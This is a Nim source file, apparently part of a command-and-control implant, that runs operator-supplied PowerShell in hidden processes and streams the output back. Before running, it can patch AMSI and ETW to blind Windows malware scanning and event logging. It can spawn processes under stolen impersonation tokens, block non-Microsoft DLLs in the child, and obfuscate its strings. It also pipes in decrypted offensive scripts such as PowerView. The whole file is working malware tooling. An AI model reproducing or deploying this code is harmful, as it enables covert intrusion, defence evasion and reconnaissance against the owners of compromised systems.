import json
import ../utils/strenc
import ../utils/debug
import ../global_data

when defined(windows):
  import winim/lean
  import token_manager
  import ../utils/patches
  
  const
    EXTENDED_STARTUPINFO_PRESENT_PS = 0x00080000'u32
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_PS = 0x00020007
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_PS = 0x100000000000'u64
  
  type
    PROC_THREAD_ATTRIBUTE_LIST_PS = object
    LPPROC_THREAD_ATTRIBUTE_LIST_PS = ptr PROC_THREAD_ATTRIBUTE_LIST_PS
    
    STARTUPINFOEXA_PS = object
      StartupInfo: STARTUPINFOA
      lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS
  
  proc InitializeProcThreadAttributeListPS(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS, 
                                           dwAttributeCount: DWORD, dwFlags: DWORD, 
                                           lpSize: ptr SIZE_T): WINBOOL
    {.importc: "InitializeProcThreadAttributeList", dynlib: "kernel32.dll", stdcall.}
  
  proc UpdateProcThreadAttributePS(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS,
                                   dwFlags: DWORD, Attribute: DWORD_PTR, 
                                   lpValue: PVOID, cbSize: SIZE_T,
                                   lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
    {.importc: "UpdateProcThreadAttribute", dynlib: "kernel32.dll", stdcall.}
  
  proc DeleteProcThreadAttributeListPS(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS): void
    {.importc: "DeleteProcThreadAttributeList", dynlib: "kernel32.dll", stdcall.}

type
  PowershellArgs = object
    command: string
    patch_amsi_arg: bool
    block_etw_arg: bool

when defined(windows):
  type
    PsStdinData = object
      handle: HANDLE
      dataPtr: pointer
      dataLen: int

    PsThreadData = object
      stdoutHandle: HANDLE
      stderrHandle: HANDLE
      active: bool
      outputChan: ptr Channel[string]

    PsSession* = ref object
      taskId*: string
      processHandle*: HANDLE
      threadHandle*: HANDLE
      active*: bool
      threadData*: ptr PsThreadData
      readerThread*: Thread[ptr PsThreadData]
      stderrReaderThread*: Thread[ptr PsThreadData]
      stdinWriterThread*: Thread[ptr PsStdinData]
      hasStdinWriter*: bool

  var activePsSessions*: seq[PsSession] = @[]

  proc psStdinWriterThread(data: ptr PsStdinData) {.thread.} =
    ## Write data to stdin pipe in background thread, then close the handle
    ## This prevents large scripts (e.g. PowerView ~1MB) from blocking the main thread
    var bytesWritten: DWORD
    var offset = 0
    while offset < data[].dataLen:
      let remaining = data[].dataLen - offset
      let chunkSize = min(4096, remaining).DWORD
      let writePtr = cast[pointer](cast[int](data[].dataPtr) + offset)
      let success = WriteFile(data[].handle, writePtr, chunkSize, addr bytesWritten, nil)
      if success == 0 or bytesWritten == 0:
        break
      offset += bytesWritten.int
    CloseHandle(data[].handle)
    deallocShared(data[].dataPtr)

  proc psOutputReaderThread(data: ptr PsThreadData) {.thread.} =
    ## Read from stdout handle in background thread
    var buffer: array[4096, char]
    var bytesRead: DWORD

    while data[].active:
      let success = ReadFile(data[].stdoutHandle, addr buffer[0], 4096, addr bytesRead, nil)

      if success != 0 and bytesRead > 0:
        var output = newString(bytesRead)
        copyMem(addr output[0], addr buffer[0], bytesRead)
        data[].outputChan[].send(output)
      elif bytesRead == 0:
        break
      else:
        break

    data[].outputChan[].send("")  # Signal EOF

  proc psStderrReaderThread(data: ptr PsThreadData) {.thread.} =
    ## Read from stderr handle in background thread
    var buffer: array[4096, char]
    var bytesRead: DWORD

    while data[].active:
      let success = ReadFile(data[].stderrHandle, addr buffer[0], 4096, addr bytesRead, nil)

      if success != 0 and bytesRead > 0:
        var output = newString(bytesRead)
        copyMem(addr output[0], addr buffer[0], bytesRead)
        data[].outputChan[].send(output)
      elif bytesRead == 0:
        break
      else:
        break

proc powershell*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a PowerShell command by spawning powershell.exe (non-blocking)
  when not defined(windows):
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("powershell is only supported on Windows")
    }
  else:
    try:
      let args = to(params, PowershellArgs)

      if args.command.len == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Command cannot be empty")
        }

      var patchOutput = ""

      # Apply patches if requested
      if args.patch_amsi_arg:
        let res = patchAMSI()
        case res
        of 0:
          patchOutput.add(obf("[+] AMSI patched successfully!\n"))
        of 1:
          patchOutput.add(obf("[-] Failed to patch AMSI\n"))
        of 2:
          patchOutput.add(obf("[+] AMSI already patched\n"))
        else:
          discard

      if args.block_etw_arg:
        let res = patchETW()
        case res
        of 0:
          patchOutput.add(obf("[+] ETW patched successfully!\n"))
        of 1:
          patchOutput.add(obf("[-] Failed to patch ETW\n"))
        of 2:
          patchOutput.add(obf("[+] ETW already patched\n"))
        else:
          discard

      # Parse optional scripts parameter
      var scripts: seq[string] = @[]
      if params.hasKey(obf("scripts")):
        for item in params[obf("scripts")]:
          scripts.add(item.getStr())

      # Build the full command with selective imported scripts
      var fullCommand = ""
      var hasImports = false

      if scripts.len > 0:
        # Selective loading: only decrypt and load specified scripts
        let selectedScripts = getImportedPsScriptsByNames(scripts)
        if selectedScripts.len > 0:
          hasImports = true
          for script in selectedScripts:
            fullCommand.add(script.content)
            fullCommand.add("\n")
      
      fullCommand.add(args.command)

      var
        si: STARTUPINFOA
        pi: PROCESS_INFORMATION

      si.cb = sizeof(STARTUPINFOA).DWORD
      si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
      si.wShowWindow = SW_HIDE

      # Create pipes for stdout/stderr/stdin
      var
        hStdoutRead, hStdoutWrite: HANDLE
        hStderrRead, hStderrWrite: HANDLE
        hStdinRead, hStdinWrite: HANDLE
        sa: SECURITY_ATTRIBUTES

      sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
      sa.bInheritHandle = TRUE
      sa.lpSecurityDescriptor = nil

      if CreatePipe(addr hStdoutRead, addr hStdoutWrite, addr sa, 0) == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stdout pipe")
        }

      if CreatePipe(addr hStderrRead, addr hStderrWrite, addr sa, 0) == 0:
        CloseHandle(hStdoutRead)
        CloseHandle(hStdoutWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stderr pipe")
        }

      if CreatePipe(addr hStdinRead, addr hStdinWrite, addr sa, 0) == 0:
        CloseHandle(hStdoutRead)
        CloseHandle(hStdoutWrite)
        CloseHandle(hStderrRead)
        CloseHandle(hStderrWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stdin pipe")
        }

      # Make sure read handles for stdout/stderr are not inherited
      discard SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0)
      discard SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0)
      # Make sure write handle for stdin is not inherited
      discard SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0)

      si.hStdOutput = hStdoutWrite
      si.hStdError = hStderrWrite
      si.hStdInput = hStdinRead

      # Build command line
      # When scripts are loaded, pipe them via stdin using -Command -
      # PowerShell reads ALL stdin before executing when using -Command -
      # Note: -File - is PowerShell Core only, not supported by powershell.exe (5.1)
      var commandLine: string
      if hasImports:
        commandLine = obf("powershell.exe -NoProfile -NonInteractive -NoLogo -Command -")
      else:
        commandLine = obf("powershell.exe -NoProfile -NonInteractive -NoLogo -InputFormat None -Command ") & fullCommand

      # Check if we have an impersonation token
      let tokenHandle = getTokenHandle()
      let blockDlls = getBlockDlls()
      var createResult: WINBOOL

      if tokenHandle != 0:
        # CreateProcessWithTokenW does not support STARTUPINFOEX,
        # so blockdlls cannot be applied with impersonated tokens
        var commandLineW = newWideCString(commandLine)

        var siW: STARTUPINFOW
        siW.cb = sizeof(STARTUPINFOW).DWORD
        siW.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
        siW.wShowWindow = SW_HIDE
        siW.hStdOutput = hStdoutWrite
        siW.hStdError = hStderrWrite
        siW.hStdInput = hStdinRead

        createResult = CreateProcessWithTokenW(
          tokenHandle,
          0,
          nil,
          cast[LPWSTR](commandLineW[0].addr),
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr siW,
          addr pi
        )

        # If it fails with ACCESS_DENIED (error 5), fall back to CreateProcessA
        if createResult == 0 and GetLastError() == 5:
          if blockDlls:
            var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_PS
            var size: SIZE_T = 0
            discard InitializeProcThreadAttributeListPS(nil, 1, 0, addr size)
            var attrList = newSeq[byte](size)
            let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST_PS](addr attrList[0])
            
            if InitializeProcThreadAttributeListPS(attrListPtr, 1, 0, addr size) != 0:
              discard UpdateProcThreadAttributePS(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_PS,
                                                   addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil)
              var siEx: STARTUPINFOEXA_PS
              siEx.StartupInfo = si
              siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA_PS).DWORD
              siEx.lpAttributeList = attrListPtr
              
              createResult = CreateProcessA(
                nil, addr commandLine[0], nil, nil,
                TRUE, DWORD(CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT_PS),
                nil, nil, cast[ptr STARTUPINFOA](addr siEx), addr pi
              )
              DeleteProcThreadAttributeListPS(attrListPtr)
            else:
              createResult = CreateProcessA(
                nil, addr commandLine[0], nil, nil,
                TRUE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi
              )
          else:
            createResult = CreateProcessA(
              nil,
              addr commandLine[0],
              nil,
              nil,
              TRUE,
              CREATE_NO_WINDOW,
              nil,
              nil,
              addr si,
              addr pi
            )
      elif blockDlls:
        # No token, but blockdlls enabled
        var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_PS
        var size: SIZE_T = 0
        discard InitializeProcThreadAttributeListPS(nil, 1, 0, addr size)
        var attrList = newSeq[byte](size)
        let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST_PS](addr attrList[0])
        
        if InitializeProcThreadAttributeListPS(attrListPtr, 1, 0, addr size) != 0:
          discard UpdateProcThreadAttributePS(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_PS,
                                               addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil)
          var siEx: STARTUPINFOEXA_PS
          siEx.StartupInfo = si
          siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA_PS).DWORD
          siEx.lpAttributeList = attrListPtr
          
          createResult = CreateProcessA(
            nil, addr commandLine[0], nil, nil,
            TRUE, DWORD(CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT_PS),
            nil, nil, cast[ptr STARTUPINFOA](addr siEx), addr pi
          )
          DeleteProcThreadAttributeListPS(attrListPtr)
        else:
          createResult = CreateProcessA(
            nil, addr commandLine[0], nil, nil,
            TRUE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi
          )
      else:
        createResult = CreateProcessA(
          nil,
          addr commandLine[0],
          nil,
          nil,
          TRUE,
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr si,
          addr pi
        )

      # Close write ends of stdout/stderr
      CloseHandle(hStdoutWrite)
      CloseHandle(hStderrWrite)

      if createResult == 0:
        let errorCode = GetLastError()
        CloseHandle(hStdoutRead)
        CloseHandle(hStderrRead)
        CloseHandle(hStdinRead)
        CloseHandle(hStdinWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create process. Error code: ") & $errorCode
        }

      # Close our copy of the child's stdin read handle
      CloseHandle(hStdinRead)

      # Set up background reader threads (non-blocking)
      var outputChan = cast[ptr Channel[string]](allocShared0(sizeof(Channel[string])))
      outputChan[].open()

      var threadData = cast[ptr PsThreadData](allocShared0(sizeof(PsThreadData)))
      threadData[].active = true
      threadData[].stdoutHandle = hStdoutRead
      threadData[].stderrHandle = hStderrRead
      threadData[].outputChan = outputChan

      var session = PsSession(
        taskId: taskId,
        processHandle: pi.hProcess,
        threadHandle: pi.hThread,
        active: true,
        threadData: threadData
      )

      # Start reader threads
      createThread(session.readerThread, psOutputReaderThread, threadData)
      createThread(session.stderrReaderThread, psStderrReaderThread, threadData)

      # If we have imports, write the full script to stdin in a background thread
      # WriteFile blocks when the data is larger than the pipe buffer (~4KB),
      # so we must NOT do this on the main thread or the agent freezes
      if hasImports:
        var sharedScript = cast[pointer](allocShared(fullCommand.len))
        copyMem(sharedScript, addr fullCommand[0], fullCommand.len)

        var stdinData = cast[ptr PsStdinData](allocShared0(sizeof(PsStdinData)))
        stdinData[].handle = hStdinWrite
        stdinData[].dataPtr = sharedScript
        stdinData[].dataLen = fullCommand.len

        session.hasStdinWriter = true
        createThread(session.stdinWriterThread, psStdinWriterThread, stdinData)
      else:
        session.hasStdinWriter = false
        CloseHandle(hStdinWrite)

      activePsSessions.add(session)

      debug "[DEBUG] PowerShell session started in background for task " & taskId

      # Return immediately - not completed, processing in background
      result = %*{
        obf("task_id"): taskId,
        obf("completed"): false,
        obf("status"): obf("processing"),
        obf("user_output"): patchOutput & obf("\n")
      }
      return result

    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Failed to execute PowerShell command: ") & e.msg
      }

when defined(windows):
  proc checkActivePsSessions*(): seq[JsonNode] =
    ## Non-blocking poll of all active PowerShell sessions
    ## Returns partial/final output responses
    result = @[]
    var completedIndices: seq[int] = @[]

    for idx, session in activePsSessions:
      if not session.active:
        completedIndices.add(idx)
        continue

      # Drain all available output from the channel (non-blocking)
      var accumulatedOutput = ""
      var gotEof = false

      var (hasOutput, output) = session.threadData[].outputChan[].tryRecv()
      while hasOutput:
        if output.len == 0:
          # EOF signal from reader thread
          gotEof = true
          break
        accumulatedOutput.add(output)
        (hasOutput, output) = session.threadData[].outputChan[].tryRecv()

      if gotEof:
        # Process has finished — check exit code and send final response
        var exitCode: DWORD = 0
        discard WaitForSingleObject(session.processHandle, 0)
        discard GetExitCodeProcess(session.processHandle, addr exitCode)

        CloseHandle(session.processHandle)
        CloseHandle(session.threadHandle)
        CloseHandle(session.threadData[].stdoutHandle)
        CloseHandle(session.threadData[].stderrHandle)

        # Join stdin writer thread if it was started
        if session.hasStdinWriter:
          joinThread(session.stdinWriterThread)

        session.active = false
        session.threadData[].active = false
        completedIndices.add(idx)

        # Drain any remaining output after EOF
        var (moreOutput, moreData) = session.threadData[].outputChan[].tryRecv()
        while moreOutput:
          if moreData.len > 0:
            accumulatedOutput.add(moreData)
          (moreOutput, moreData) = session.threadData[].outputChan[].tryRecv()

        if accumulatedOutput.len == 0:
          accumulatedOutput = obf("(No output)")

        result.add(%*{
          obf("task_id"): session.taskId,
          obf("completed"): true,
          obf("status"): if exitCode == 0: obf("success") else: obf("error"),
          obf("user_output"): accumulatedOutput
        })

      elif accumulatedOutput.len > 0:
        # Partial output available — stream it back
        result.add(%*{
          obf("task_id"): session.taskId,
          obf("completed"): false,
          obf("user_output"): accumulatedOutput
        })

    # Remove completed sessions (iterate in reverse to preserve indices)
    for i in countdown(completedIndices.high, 0):
      activePsSessions.delete(completedIndices[i])
